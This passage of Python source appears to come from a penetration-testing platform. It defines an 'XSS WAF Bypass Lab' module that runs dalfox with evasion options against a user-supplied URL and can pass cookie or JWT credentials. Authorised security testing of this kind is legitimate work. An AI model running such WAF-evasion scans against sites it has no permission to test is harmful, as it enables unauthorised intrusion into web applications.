        return {"status": "done", "findings": findings}


# ─── [X-08] XSS WAF Bypass Lab ────────────────────────────────────────────────

class XSSWAFBypassModule(BaseModule):
    id = "X-08"
    name = "XSS WAF Bypass Lab"
    category = "xss"
    description = (
        "Test vendor-specific WAF bypass payloads using dalfox encoding/evasion modes. "
        "Supports Cloudflare, Akamai, AWS WAF, ModSecurity, and generic bypass payload sets."
    )
    risk_level = "high"
    tags = ["xss", "waf-bypass", "dalfox", "evasion", "cloudflare", "akamai"]
    celery_queue = "xss_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/search?q=test",
        ),
        FieldSchema(
            key="waf_vendor",
            label="WAF Vendor",
            field_type="select",
            default="generic",
            options=[
                {"value": "generic",      "label": "Generic (all bypass techniques)"},
                {"value": "cloudflare",   "label": "Cloudflare"},
                {"value": "akamai",       "label": "Akamai"},
                {"value": "aws",          "label": "AWS WAF"},
                {"value": "modsecurity",  "label": "ModSecurity"},
                {"value": "imperva",      "label": "Imperva / Incapsula"},
            ],
        ),
        FieldSchema(
            key="bypass_techniques",
            label="Bypass Techniques",
            field_type="checkbox_group",
            default=["encoding", "case", "whitespace", "tag_fuzz"],
            options=[
                {"value": "encoding",    "label": "URL/HTML/Unicode encoding"},
                {"value": "case",        "label": "Mixed-case tag names"},
                {"value": "whitespace",  "label": "Tab/newline whitespace injection"},
                {"value": "tag_fuzz",    "label": "Exotic HTML tags (SVG, MATH, etc.)"},
                {"value": "js_break",    "label": "JavaScript string break-out"},
                {"value": "polyglot",    "label": "Polyglot payloads"},
            ],
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="cookie_value",
            label="Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT",
            field_type="textarea",
            required=False,
            sensitive=True,
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=5,
            min_value=1,
            max_value=20,
            step=1,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        runner = ToolRunner("dalfox")
        out_file = runner.output_file_path(job_id, "txt")

        vendor    = params.get("waf_vendor", "generic")
        techniques = params.get("bypass_techniques", ["encoding", "case"])

        args = [
            "url", params["target_url"],
            "--output", str(out_file),
            "--format", "plain",
            "--no-color",
            "--worker", str(params.get("threads", 5)),
            "--waf-evasion",
        ]

        # Dalfox encoding bypass flags
        if "encoding" in techniques:
            args.append("--enc-char-set")
        if "polyglot" in techniques:
            args.append("--use-head-method")

        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("cookie_value"):
            args += ["--cookie", params["cookie_value"]]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            args += ["--header", f"Authorization: Bearer {params['jwt_token'].strip()}"]

        mask = []
        if params.get("cookie_value"):
            mask.append(params["cookie_value"][:10])
        if params.get("jwt_token"):
            mask.append(params["jwt_token"].strip()[:20])

        stream("info", f"Launching WAF bypass XSS scan — vendor: {vendor}")
        stream("info", f"Bypass techniques: {', '.join(techniques)}")

        result = runner.run(
            args=args, stream=stream, timeout=self.time_limit,
            mask_patterns=mask or None,
        )

        findings = _parse_dalfox_output(str(out_file), params["target_url"], stream)

        # Tag findings with WAF bypass context
        for f in findings:
            f["title"] = f"XSS (WAF Bypass — {vendor.title()}) — {f.get('title', 'XSS')}"
            f["description"] = (
                f"XSS payload bypassed {vendor.title()} WAF protections. "
                + f.get("description", "")
            )

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
        }
